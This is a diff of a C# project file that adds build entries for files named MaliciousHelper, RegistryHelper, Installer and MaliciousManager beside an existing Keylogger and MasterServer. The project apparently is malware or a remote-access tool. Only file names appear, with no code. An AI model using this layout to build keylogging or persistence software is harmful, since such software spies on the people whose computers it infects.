@@ -53,6 +53,7 @@
     <Reference Include="System" />
     <Reference Include="System.Core" />
     <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
@@ -65,7 +66,14 @@
     <Compile Include="Helper\DynamicNativeLibrary.cs" />
     <Compile Include="Helper\FileHelper.cs" />
     <Compile Include="Helper\KeyloggerHelper.cs" />
+    <Compile Include="Helper\MaliciousHelper.cs" />
+    <Compile Include="Helper\PlatformHelper.cs" />
+    <Compile Include="Helper\RegistryHelper.cs" />
+    <Compile Include="Helper\WindowsHelper.cs" />
+    <Compile Include="Malicious\IMalicious.cs" />
+    <Compile Include="Malicious\Installer.cs" />
     <Compile Include="Malicious\Keylogger.cs" />
+    <Compile Include="Malicious\MaliciousManager.cs" />
     <Compile Include="MasterServer.cs" />
     <Compile Include="NetworkService.cs" />
     <Compile Include="Program.cs" />
